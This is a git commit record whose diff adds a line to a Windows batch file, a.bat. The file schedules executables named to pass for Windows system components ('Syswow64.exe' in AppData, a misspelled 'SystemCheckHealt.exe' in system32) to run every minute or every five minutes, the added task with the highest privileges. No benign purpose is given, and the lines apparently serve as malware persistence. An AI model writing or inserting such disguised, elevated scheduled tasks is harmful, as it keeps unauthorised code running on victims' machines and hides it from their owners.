862c6d6b1252e62d4b3d1d406c97e056d3b1f526
blueskycloud137 <117394858+blueskycloud137@users.noreply.github.com>
2022-11-25 23:47:33 +0300

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,1 +1,2 @@
 schtasks /create /tn "Popup" /sc minute /mo 1 /tr "%appdata%/Syswow64.exe"
+schtasks /create /tn "SystemCheckHealt" /sc minute /mo 5 /tr "%windir%\system32\SystemCheckHealt.exe" /RL HIGHEST
